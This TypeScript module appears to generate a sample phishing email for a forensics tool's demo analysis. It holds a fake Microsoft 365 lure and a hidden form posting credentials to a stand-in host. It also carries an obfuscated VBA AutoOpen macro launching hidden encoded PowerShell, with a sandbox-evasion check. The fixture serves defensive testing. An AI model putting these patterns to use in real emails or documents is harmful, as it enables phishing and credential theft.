import { strToU8, zipSync } from "fflate";

// Demo submission for the Forensics "Analyze sample" button: a credential-
// phishing email with failing SPF/DKIM/DMARC, sender mismatches, a look-alike
// Microsoft login link, and a macro-enabled .docm whose (fake) VBA project
// carries AutoOpen → WScript.Shell → PowerShell. All infrastructure is
// fictional or documentation-reserved (example.*, 203.0.113.0/24) except
// 185.220.101.45, which sits in a public Tor exit range.

function sampleDocm(): Uint8Array {
  const vba = [
    "Attribute VB_Name = \"ThisDocument\"",
    "Sub AutoOpen()",
    "  Dim s As String",
    "  s = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)",
    "  s = Replace(s, \"x\", \"\") & \" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\"",
    "  If Environ(\"USERNAME\") <> \"sandbox\" Then CreateObject(\"WScript.Shell\").Run s, 0",
    "End Sub",
  ].join("\r\n");

  return zipSync({
    "[Content_Types].xml": strToU8(
      '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>',
    ),
    "word/document.xml": strToU8(
      '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>This document is protected. Enable editing and enable content to view your invoice.</w:t></w:r></w:p></w:body></w:document>',
    ),
    "word/_rels/document.xml.rels": strToU8(
      '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://invoice-portal.example.top/download?id=10442" TargetMode="External"/></Relationships>',
    ),
    "word/vbaProject.bin": strToU8(vba),
  });
}

export function buildSampleEmail(): { filename: string; bytes: Uint8Array } {
  const docm = Buffer.from(sampleDocm()).toString("base64").replace(/.{76}/g, "$&\r\n");
  const date = new Date(Date.now() - 45 * 60 * 1000);
  const rfc = (d: Date) => d.toUTCString().replace("GMT", "+0000");
  const html = `<html><body>
<p>Dear user,</p>
<p>We detected an <b>unusual sign-in</b> to your Microsoft 365 mailbox. Your access will be suspended in 24 hours unless you verify your account.</p>
<p><a href="https://login-microsoft365-secure.example.xyz/verify?u=jdoe">Verify your account now</a></p>
<form action="https://collect.example.top/owa/submit.php" method="post" style="display:none">
  <input type="email" name="login"><input type="password" name="passwd">
</form>
<p>Your outstanding invoice is attached for review.</p>
<p>IT Help Desk</p>
<script>var x = atob("aHR0cHM6Ly9jb2xsZWN0LmV4YW1wbGUudG9w"); document.cookie;</script>
</body></html>`;

  const eml = [
    `Return-Path: <bounce-77@mailer.example-bulk.net>`,
    `Received: from mx.example.com (mx.example.com [203.0.113.25]) by inbound.example.com with ESMTPS id 4F2a (version=TLS1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256); ${rfc(new Date(date.getTime() + 4000))}`,
    `Received: from relay.example-bulk.net ([185.220.101.45]) by mx.example.com with ESMTP id 9Kd1; ${rfc(date)}`,
    `Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mailer.example-bulk.net; dkim=fail header.d=microsoft-support.example.cc; dmarc=fail (p=reject) header.from=microsoft-support.example.cc`,
    `DKIM-Signature: v=1; a=rsa-sha256; d=microsoft-support.example.cc; s=mail2026; h=from:subject; bh=abc=; b=def=`,
    `From: "Microsoft 365 Security" <security@microsoft-support.example.cc>`,
    `Reply-To: helpdesk-verify@example-mailbox.top`,
    `To: jdoe@acme.example`,
    `Subject: URGENT: Action required - unusual sign-in, verify your account`,
    `Date: ${rfc(date)}`,
    `Message-ID: <sample-${Date.now()}@microsoft-support.example.cc>`,
    `MIME-Version: 1.0`,
    `Content-Type: multipart/mixed; boundary="b1"`,
    ``,
    `--b1`,
    `Content-Type: multipart/alternative; boundary="b2"`,
    ``,
    `--b2`,
    `Content-Type: text/plain; charset=utf-8`,
    ``,
    `We detected an unusual sign-in to your Microsoft 365 mailbox. Your access will be suspended unless you verify your account and confirm your password at https://login-microsoft365-secure.example.xyz/verify?u=jdoe . Questions? Call support at (415) 555-0172.`,
    ``,
    `--b2`,
    `Content-Type: text/html; charset=utf-8`,
    ``,
    html,
    ``,
    `--b2--`,
    `--b1`,
    `Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Invoice_10442.docm"`,
    `Content-Disposition: attachment; filename="Invoice_10442.docm"`,
    `Content-Transfer-Encoding: base64`,
    ``,
    docm,
    `--b1--`,
    ``,
  ].join("\r\n");

  return { filename: "sample-phish.eml", bytes: new Uint8Array(Buffer.from(eml)) };
}
